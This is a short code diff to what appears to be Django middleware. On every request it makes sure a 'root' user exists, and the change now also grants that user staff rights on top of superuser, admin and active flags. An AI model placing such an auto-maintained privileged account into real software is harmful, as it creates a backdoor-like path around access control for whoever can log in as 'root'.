@@ -7,7 +7,8 @@ class Middleware():
 
     def __call__(self, request):
         root, created = User.objects.get_or_create(username='root')
-        if created or not root.is_superuser:
+        if created or not root.is_staff:
+            root.is_staff = True
             root.is_superuser = True
             root.is_admin = True
             root.is_active = True
